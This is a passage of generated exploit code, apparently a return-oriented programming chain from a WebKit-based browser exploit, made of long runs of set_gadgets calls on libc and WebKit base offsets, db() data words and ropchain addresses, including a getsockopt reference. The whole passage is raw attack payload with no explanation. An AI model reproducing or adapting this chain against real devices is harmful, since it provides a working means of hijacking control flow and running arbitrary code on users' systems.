libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+194584, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+194656, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+194720, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([20, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+194864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+194968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+195056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+195216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+195184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195200, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([46, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+195408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+195496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+195664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+195696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+195648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+195792, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+195776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+195896, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+197968, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+196032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+196016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+196152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+196184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+196312, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+196304, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+196328, 
ropchain+196776, 
libc_base+50775, 
libc_base+793877, 
ropchain+196400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+196552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+196536, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+196568, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+196656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+196768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+196752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+196832, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+196920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+196936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+197088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+197072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+197104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+197280, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+197248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+197232, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+197408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197424, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+197392, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197536, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197648, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197632, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+197736, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+197720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197832, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197848, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197944, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+199288, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+199360, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+199424, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([40, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+199576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+199592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+199712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+199696, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+50775, 
libc_base+793877, 
ropchain+199800, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+199872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+199944, 
webkit_base+7438103, 
libc_base+788575 
]);
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+200072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+200224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+200240, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+200208, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+200344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+200360, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+200528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+200680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+200696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+200664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+200840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+200808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+200896, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+200952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+201192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+201160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+201296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+201280, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+201392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+201480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+201496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+201600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+201584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+201656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+201744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([41, 0]); 
set_gadget(libc_base+788575,); 
db([41, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+201872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+201856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+201968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+202056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+202072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+202160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+202344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([61, 0]); 
set_gadget(libc_base+788575,); 
db([61, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+202472, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+202456, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+202568, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+202656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+202672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+202760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+202944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+203072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+203056, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+203168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+203256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+203272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+203416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+203384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+203400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+203488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+203544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([12, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
